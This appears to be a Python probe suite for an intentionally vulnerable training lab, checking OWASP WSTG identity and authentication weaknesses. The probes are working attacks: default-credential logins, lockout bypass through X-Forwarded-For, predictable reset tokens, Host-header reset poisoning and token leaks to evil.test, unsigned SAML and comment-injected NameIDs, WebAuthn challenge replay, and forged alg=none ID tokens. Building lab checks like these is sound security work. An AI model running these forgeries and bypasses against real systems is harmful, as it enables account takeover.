"""WSTG probes for machine 02 - Identity Management + Authentication.

Each probe asserts that the intentional weakness is demonstrably present.
Stdlib + labhttp only, except athn_13 which lazily imports cbor2/cryptography
(see verify/requirements.txt) to drive a software WebAuthn authenticator.
"""
import base64
import concurrent.futures
import hashlib
import hmac
import json
import struct
import time
import urllib.parse
import uuid

from labhttp import get, post, request


def _b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64u_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _uniq(prefix="u"):
    return f"{prefix}{uuid.uuid4().hex[:10]}"


def _totp(seed_b32, t=None):
    key = base64.b32decode(seed_b32 + "=" * (-len(seed_b32) % 8))
    counter = int((t or time.time()) // 30)
    d = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    off = d[-1] & 0x0F
    return f"{(struct.unpack('>I', d[off:off + 4])[0] & 0x7FFFFFFF) % 1000000:06d}"


def _login(ctx, username, password, remember=False, xff=None):
    s = ctx.session()
    headers = {"X-Forwarded-For": xff} if xff else None
    fields = {"username": username, "password": password}
    if remember:
        fields["remember"] = "1"
    r = s.form("/login", fields, headers=headers)
    return s, r


# --- WSTG-IDNT ---------------------------------------------------------------

def idnt_01(ctx):
    roles = get(ctx.url("/api/roles")).json()
    undoc = [r for r in roles["roles"] if r not in roles["documented"]
             and "*" in roles["roles"][r]]
    name = _uniq("role")
    reg = post(ctx.url("/register"), data={"username": name, "password": "x", "role": "superadmin"})
    s, _ = _login(ctx, name, "x")
    panel = s.get("/admin/panel")
    ok = (bool(undoc) and reg.status == 201 and reg.json()["role"] == "superadmin"
          and panel.status == 200 and panel.json()["role"] == "superadmin"
          and panel.json()["permissions"] == ["*"])
    return ok, f"undocumented wildcard roles={undoc}; self-assigned superadmin -> panel {panel.status} perms={panel.json().get('permissions')}"


def idnt_02(ctx):
    name = _uniq("reg")
    # disposable domain, no email verification, immediately active
    r1 = post(ctx.url("/register"), data={"username": name, "password": "pw",
                                          "email": f"{name}@mailinator.com"})
    j1 = r1.json()
    s, lr = _login(ctx, name, "pw")
    # duplicate / race registration: two concurrent posts, both succeed
    dup = _uniq("dup")
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        futs = [ex.submit(post, ctx.url("/register"),
                          data={"username": dup, "password": "pw", "email": "a@b.test"})
                for _ in range(2)]
        results = [f.result() for f in futs]
    count = get(ctx.url("/api/users?username=" + urllib.parse.quote(dup))).json()["count"]
    ok = (r1.status == 201 and j1["email_verified"] is False and j1["active"] is True
          and lr.status == 200 and all(r.status == 201 for r in results) and count >= 2)
    return ok, (f"disposable accepted verified={j1['email_verified']} active={j1['active']} login={lr.status}; "
                f"race codes={[r.status for r in results]} duplicate_rows={count}")


def idnt_03(ctx):
    prefix = _uniq("svc")
    r = post(ctx.url("/api/provision/bulk"), data={"count": 3, "prefix": prefix})
    j = r.json()
    ids = [c["id"] for c in j["created"]]
    sequential = ids == list(range(ids[0], ids[0] + len(ids)))
    # predictable sequential id: next account readable by guessing id+1
    nxt = get(ctx.url(f"/api/users/{ids[-1] + 1}"))
    # provisioned account uses a known default password, no authz on the endpoint
    s, lr = _login(ctx, j["created"][0]["username"], "Welcome123!")
    ok = (r.status == 201 and j["authorized"] is False and sequential and len(ids) == 3
          and lr.status == 200)
    return ok, (f"unauth bulk provision ids={ids} sequential={sequential} authorized={j['authorized']}; "
                f"default-password login={lr.status}; next-id guess={nxt.status}")


def idnt_04(ctx):
    existing = post(ctx.url("/login"), data={"username": "admin", "password": "wrong"})
    unknown = post(ctx.url("/login"), data={"username": _uniq("ghost"), "password": "x"})
    e, u = existing.json(), unknown.json()
    # registration reveals existence
    dupname = _uniq("enum")
    post(ctx.url("/register"), data={"username": dupname, "password": "x"})
    dup = post(ctx.url("/register"), data={"username": dupname, "password": "x"}).json()
    # reset reveals existence
    rex = post(ctx.url("/reset/request"), data={"username": "admin"})
    run = post(ctx.url("/reset/request"), data={"username": _uniq("ghost")})
    guessable = []
    for g in ("admin", "administrator", "test"):
        gr = post(ctx.url("/login"), data={"username": g, "password": "definitely-wrong"}).json()
        guessable.append(gr.get("error") == "invalid_password")
    ok = (e.get("error") == "invalid_password" and "existing user" in e.get("message", "")
          and u.get("error") == "no_such_user" and dup.get("username_exists") is True
          and rex.status == 200 and run.status == 404 and all(guessable))
    return ok, (f"login existing='{e.get('error')}' unknown='{u.get('error')}'; "
                f"register duplicate_flag={dup.get('username_exists')}; reset {rex.status}/{run.status}; "
                f"guessable admin/administrator/test={guessable}")


def idnt_05(ctx):
    cases = {"empty": "", "one_char": "x", "unicode": "Ünïcödé😀", "space_only": "   "}
    codes = {}
    for label, uname in cases.items():
        r = post(ctx.url("/register"), data={"username": uname, "password": "pw"})
        codes[label] = r.status
    ok = all(c == 201 for c in codes.values())
    return ok, f"username policy unenforced, registration codes={codes}"


# --- WSTG-ATHN ---------------------------------------------------------------

def athn_01(ctx):
    page = get(ctx.url("/login"))
    body = page.text
    http_action = "action='http://" in body or 'action="http://' in body
    hsts = page.header("Strict-Transport-Security")
    s, lr = _login(ctx, "alice", "Password123!")
    ok = (http_action and "type='password'" in body and hsts is None and lr.status == 200
          and ctx.base.startswith("http://"))
    return ok, f"form posts over http={http_action}; HSTS={hsts}; cleartext login={lr.status}; base={ctx.base}"


def athn_02(ctx):
    pairs = [("admin", "admin"), ("admin", "password"), ("operator", "operator")]
    codes = {}
    for u, p in pairs:
        _, r = _login(ctx, u, p)
        codes[f"{u}/{p}"] = r.status
    ok = all(c == 200 for c in codes.values())
    return ok, f"default credentials accepted: {codes}"


def athn_03(ctx):
    ip1, ip2 = f"10.9.{uuid.uuid4().int % 200}.1", f"10.9.{uuid.uuid4().int % 200}.2"
    # 5 failures lock the (username, XFF) bucket
    last = None
    for i in range(5):
        last = post(ctx.url("/login"), data={"username": "lockme", "password": "bad"},
                    headers={"X-Forwarded-For": ip1})
    locked = post(ctx.url("/login"), data={"username": "lockme", "password": "Correct123!"},
                  headers={"X-Forwarded-For": ip1})
    # rotate the client-controlled header -> lockout bypassed
    bypass = post(ctx.url("/login"), data={"username": "lockme", "password": "Correct123!"},
                  headers={"X-Forwarded-For": ip2})
    # counter reset parameter also clears it
    reset = post(ctx.url("/login?reset_counter=1"),
                 data={"username": "lockme", "password": "Correct123!"},
                 headers={"X-Forwarded-For": ip1})
    ok = (locked.status == 423 and bypass.status == 200 and reset.status == 200)
    return ok, (f"5 failures -> locked={locked.status}; rotate X-Forwarded-For -> {bypass.status}; "
                f"reset_counter=1 -> {reset.status}")


def athn_04(ctx):
    noauth = get(ctx.url("/account"))
    bypass = get(ctx.url("/account?authenticated=true"))
    j = bypass.json() if bypass.status == 200 else {}
    cookie_bypass = get(ctx.url("/account"), headers={"Cookie": "authenticated=true"})
    ok = (noauth.status == 401 and bypass.status == 200 and j.get("username") == "admin"
          and "api_key" in j and cookie_bypass.status == 200)
    return ok, (f"/account noauth={noauth.status}; ?authenticated=true -> {bypass.status} "
                f"user={j.get('username')} api_key_leak={'api_key' in j}; cookie bypass={cookie_bypass.status}")


def athn_05(ctx):
    s, r = _login(ctx, "alice", "Password123!", remember=True)
    rem = s.cookies.get("remember_me")
    decoded = base64.b64decode(rem).decode() if rem else ""
    # replay the cookie in a brand-new session (no login)
    replay = get(ctx.url("/account"), headers={"Cookie": f"remember_me={rem}"})
    ok = (rem is not None and decoded == "alice:Password123!" and replay.status == 200
          and replay.json().get("username") == "alice")
    return ok, f"remember_me cookie decodes to '{decoded}'; replay-only auth={replay.status}"


def athn_06(ctx):
    s, _ = _login(ctx, "alice", "Password123!")
    r = s.get("/account")
    cc = r.header("Cache-Control", "")
    ok = (r.status == 200 and "public" in cc and "no-store" not in cc and "no-cache" not in cc
          and "api_key" in r.text and "email" in r.text)
    return ok, f"authenticated /account Cache-Control='{cc}'; sensitive body cached (api_key/email present)"


def athn_07(ctx):
    noauth = get(ctx.url("/basic/profile"))
    www = noauth.header("WWW-Authenticate", "")
    basic = get(ctx.url("/basic/profile"),
                headers={"Authorization": "Basic " + base64.b64encode(b"admin:admin").decode()})
    # GET-based login puts credentials in the URL query string
    getlogin = get(ctx.url("/login?username=admin&password=admin"))
    ok = (noauth.status == 401 and www.startswith("Basic") and basic.status == 200
          and getlogin.status == 200 and ctx.base.startswith("http://"))
    return ok, (f"Basic-over-HTTP: 401 WWW-Authenticate='{www}' authed={basic.status}; "
                f"GET login with creds in URL={getlogin.status}")


def athn_08(ctx):
    name = _uniq("secq")
    post(ctx.url("/register"), data={"username": name, "password": "pw"})  # default answer 'smith'
    q = get(ctx.url("/recover/questions?username=" + name))
    wrong = []
    for a in ["jones", "brown", "wilson", "taylor", "davies", "clark", "lee", "walker",
              "hall", "allen", "young", "king", "wright", "scott", "green", "baker",
              "adams", "nelson", "hill", "carter"]:
        wrong.append(post(ctx.url("/recover/answer"), data={"username": name, "answer": a}).status)
    right = post(ctx.url("/recover/answer"), data={"username": name, "answer": "smith"})
    ok = (q.status == 200 and all(c == 401 for c in wrong) and right.status == 200
          and "reset_token" in right.json())
    return ok, (f"questions exposed={q.status}; 20 brute-force answers no rate-limit "
                f"(codes all 401={all(c == 401 for c in wrong)}); 'smith' -> {right.status} "
                f"token={right.json().get('reset_token')}")


def athn_09(ctx):
    a, b = _uniq("rA"), _uniq("rB")
    post(ctx.url("/register"), data={"username": a, "password": "oldA"})
    post(ctx.url("/register"), data={"username": b, "password": "oldB"})
    # Host-header poisoning of the reset link
    ra = post(ctx.url("/reset/request"), data={"username": a}, headers={"Host": "evil.test"})
    ja = ra.json()
    rb = post(ctx.url("/reset/request"), data={"username": b})
    jb = rb.json()
    ta, tb = ja["token"], jb["token"]
    predictable = tb.isdigit() and len(tb) <= 4 and int(tb) == int(ta) + 1
    # confirm reset for B using the PREDICTED token, no old password
    confirm = post(ctx.url("/reset/confirm"), data={"token": str(int(ta) + 1), "new_password": "newB"})
    _, login = _login(ctx, b, "newB")
    # no expiry: token A still usable afterwards
    reuse = post(ctx.url("/reset/confirm"), data={"token": ta, "new_password": "newA"})
    ok = ("evil.test" in ja["reset_link"] and predictable and confirm.status == 200
          and confirm.json()["old_password_required"] is False and login.status == 200
          and reuse.status == 200)
    return ok, (f"poisoned link='{ja['reset_link']}'; tokens {ta}->{tb} predictable={predictable}; "
                f"predicted-token reset no-old-password={confirm.status}; login new pw={login.status}; "
                f"token reuse (no expiry)={reuse.status}")


def athn_10(ctx):
    # web channel enforces MFA for mobileuser
    s, web = _login(ctx, "mobileuser", "Mobile123!")
    web_account = s.get("/account")
    # mobile channel: Basic auth, no MFA
    mob = post(ctx.url("/mobile/login"),
               headers={"Authorization": "Basic " + base64.b64encode(b"mobileuser:Mobile123!").decode()})
    mj = mob.json()
    # no lockout on mobile: 10 wrong then correct
    codes = []
    for _ in range(10):
        codes.append(post(ctx.url("/mobile/login"),
                          headers={"Authorization": "Basic " + base64.b64encode(b"mobileuser:wrong").decode()}).status)
    after = post(ctx.url("/mobile/login"),
                 headers={"Authorization": "Basic " + base64.b64encode(b"mobileuser:Mobile123!").decode()})
    ok = (web.status == 200 and web.json()["mfa_required"] is True and web_account.status == 403
          and mob.status == 200 and mj["mfa_skipped"] is True and all(c == 401 for c in codes)
          and after.status == 200)
    return ok, (f"web MFA required={web.json()['mfa_required']} /account={web_account.status}; "
                f"mobile Basic skips MFA={mj['mfa_skipped']} status={mob.status}; "
                f"10 failures no lockout, correct after={after.status}")


def athn_11(ctx):
    s, r = _login(ctx, "mfauser", "Mfa123!")
    # jump straight to the post-MFA URL without verifying
    dash = s.get("/mfa/dashboard")
    dj = dash.json()
    # predictable TOTP seed derived only from username
    seed = base64.b32encode(b"mfauser").decode().rstrip("=")
    code = _totp(seed)
    verify = s.form("/mfa/verify", {"code": code})
    # enumerable backup code also works on a fresh login
    s2, _ = _login(ctx, "mfauser", "Mfa123!")
    backup = s2.form("/mfa/verify", {"code": "000001"})
    ok = (r.json()["mfa_required"] is True and dash.status == 200 and dj["mfa_passed"] is False
          and verify.status == 200 and backup.status == 200)
    return ok, (f"post-MFA /mfa/dashboard reached pre-verification={dash.status} mfa_passed={dj['mfa_passed']}; "
                f"predictable-seed TOTP {code} -> {verify.status}; enumerable backup 000001 -> {backup.status}")


def athn_12(ctx):
    kc = ctx.url("keycloak")
    idp = get(kc + "/realms/lab/protocol/saml/descriptor")
    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    def assertion(nameid, expired=True, audience="wrong-audience"):
        nooa = "2001-01-01T00:00:00Z" if expired else "2099-01-01T00:00:00Z"
        return (
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
            'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r" Version="2.0" '
            f'IssueInstant="{now}">'
            f'<saml:Issuer>{kc}/realms/lab</saml:Issuer>'
            '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
            '<saml:Assertion ID="_a" Version="2.0" '
            f'IssueInstant="{now}">'
            f'<saml:Issuer>{kc}/realms/lab</saml:Issuer>'
            '<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
            f'{nameid}</saml:NameID></saml:Subject>'
            f'<saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="{nooa}">'
            f'<saml:AudienceRestriction><saml:Audience>{audience}</saml:Audience></saml:AudienceRestriction>'
            '</saml:Conditions>'
            f'<saml:AuthnStatement AuthnInstant="{now}"><saml:AuthnContext>'
            '<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>'
            '</saml:AuthnContext></saml:AuthnStatement>'
            '</saml:Assertion></samlp:Response>')

    # 1) unsigned, expired, wrong-audience assertion for admin
    s1 = ctx.session()
    r1 = s1.form("/saml/acs", {"SAMLResponse": base64.b64encode(assertion("admin@corp.lab").encode()).decode()})
    who1 = s1.get("/whoami").json()
    # 2) XML comment injection in NameID truncates to 'admin'
    s2 = ctx.session()
    r2 = s2.form("/saml/acs", {"SAMLResponse": base64.b64encode(assertion("admin<!---->@corp.lab").encode()).decode()})
    who2 = s2.get("/whoami").json()
    ok = (idp.status == 200 and "EntityDescriptor" in idp.text
          and r1.status == 200 and r1.json()["signature_checked"] is False
          and who1.get("user") == "admin" and r2.status == 200 and who2.get("user") == "admin")
    return ok, (f"real IdP descriptor={idp.status}; unsigned+expired+wrong-audience assertion -> "
                f"{r1.status} user={who1.get('user')} sig_checked={r1.json().get('signature_checked')}; "
                f"comment-injection NameID -> user={who2.get('user')}")


def _wa_software_authenticator():
    """Build a minimal ES256 software authenticator (cbor2 + cryptography)."""
    import cbor2
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes

    key = ec.generate_private_key(ec.SECP256R1())
    nums = key.public_key().public_numbers()
    cose = {1: 2, 3: -7, -1: 1, -2: nums.x.to_bytes(32, "big"), -3: nums.y.to_bytes(32, "big")}
    return key, cose, cbor2, hashes


def athn_13(ctx):
    key, cose, cbor2, hashes = _wa_software_authenticator()
    from cryptography.hazmat.primitives.asymmetric import ec

    rp_id = "127.0.0.1"
    origin = ctx.base
    rp_hash = hashlib.sha256(rp_id.encode()).digest()
    cred_id = uuid.uuid4().bytes
    name = _uniq("wa")
    post(ctx.url("/register"), data={"username": name, "password": "pw"})

    # registration options: UV discouraged, attestation none, static challenge
    opts = post(ctx.url("/webauthn/register/options"), data={"username": name}).json()
    challenge_b64 = opts["challenge"]
    uv = opts.get("authenticatorSelection", {}).get("userVerification")
    att = opts.get("attestation")

    # authData WITHOUT the UV bit (0x41 = UP|AT), fmt=none (no attestation)
    auth_data = (rp_hash + bytes([0x41]) + struct.pack(">I", 0)
                 + b"\x00" * 16 + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose))
    att_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})
    cd = json.dumps({"type": "webauthn.create", "challenge": challenge_b64, "origin": origin}).encode()
    reg_cred = {"id": _b64u(cred_id), "rawId": _b64u(cred_id), "type": "public-key",
                "response": {"clientDataJSON": _b64u(cd), "attestationObject": _b64u(att_obj)}}
    reg = post(ctx.url("/webauthn/register/complete"), data={"username": name, "credential": reg_cred})

    # credential-id enumeration, unauthenticated
    enum = get(ctx.url("/webauthn/credentials?username=" + name)).json()

    # assertion in a FRESH session that never requested options (challenge not session-bound)
    fresh = ctx.session()
    a_auth = rp_hash + bytes([0x01]) + struct.pack(">I", 1)  # UP only, no UV
    a_cd = json.dumps({"type": "webauthn.get", "challenge": challenge_b64, "origin": origin}).encode()
    sig = key.sign(a_auth + hashlib.sha256(a_cd).digest(), ec.ECDSA(hashes.SHA256()))
    a_cred = {"id": _b64u(cred_id), "rawId": _b64u(cred_id), "type": "public-key",
              "response": {"clientDataJSON": _b64u(a_cd), "authenticatorData": _b64u(a_auth),
                           "signature": _b64u(sig), "userHandle": _b64u(name.encode())}}
    auth = fresh.post("/webauthn/login/complete", data={"credential": a_cred})
    who = fresh.get("/whoami").json()

    ok = (reg.status == 200 and uv == "discouraged" and att == "none"
          and len(enum.get("credentials", [])) >= 1 and auth.status == 200
          and auth.json().get("challenge_session_bound") is False and who.get("user") == name)
    return ok, (f"UV={uv} attestation={att}; no-UV software credential registered={reg.status}; "
                f"cred-id enumeration={len(enum.get('credentials', []))}; "
                f"assertion in fresh session (static challenge) -> {auth.status} user={who.get('user')} "
                f"session_bound={auth.json().get('challenge_session_bound')}")


def athn_14(ctx):
    kc = ctx.url("keycloak")
    # real OIDC token from Keycloak (password grant) to prove federation is live
    tok = post(kc + "/realms/lab/protocol/openid-connect/token",
               data=urllib.parse.urlencode({"grant_type": "password", "client_id": "portal-rp",
                                            "username": "alice", "password": "Password123!",
                                            "scope": "openid"}),
               headers={"Content-Type": "application/x-www-form-urlencoded"})
    real = tok.json().get("id_token", "")
    s1 = ctx.session()
    s1.get("/oidc/callback?id_token=" + real)
    who_real = s1.get("/whoami").json()

    # forged alg=none ID token, no nonce, mismatched state
    header = _b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64u(json.dumps({"preferred_username": "admin", "sub": "admin",
                                "iss": kc + "/realms/lab", "aud": "portal-rp"}).encode())
    forged = f"{header}.{payload}."
    s2 = ctx.session()
    cb = s2.get("/oidc/callback?id_token=" + forged + "&state=totally-wrong")
    who_forced = s2.get("/whoami").json()

    # open redirect_uri (substring match) leaks tokens in the fragment to a third party
    s3 = ctx.session()
    evil = "http://evil.test/steal?x=127.0.0.1:8200"
    login = s3.get("/oidc/login?redirect_uri=" + urllib.parse.quote(evil, safe=""))
    leak = s3.get("/oidc/callback?id_token=" + forged)
    loc = leak.header("Location", "")
    rejected = s3.get("/oidc/login?redirect_uri=" + urllib.parse.quote("http://evil.test/no", safe=""))

    ok = (tok.status == 200 and who_real.get("user") == "alice"
          and cb.status in (302, 303) and who_forced.get("user") == "admin"
          and login.status in (302, 303) and leak.status in (302, 303)
          and loc.startswith("http://evil.test") and "id_token=" in loc
          and rejected.status == 400)
    return ok, (f"real Keycloak token -> user={who_real.get('user')}; forged alg=none (no nonce, bad state) "
                f"-> user={who_forced.get('user')}; open redirect leaks token: Location='{loc[:80]}'; "
                f"non-matching redirect rejected={rejected.status}")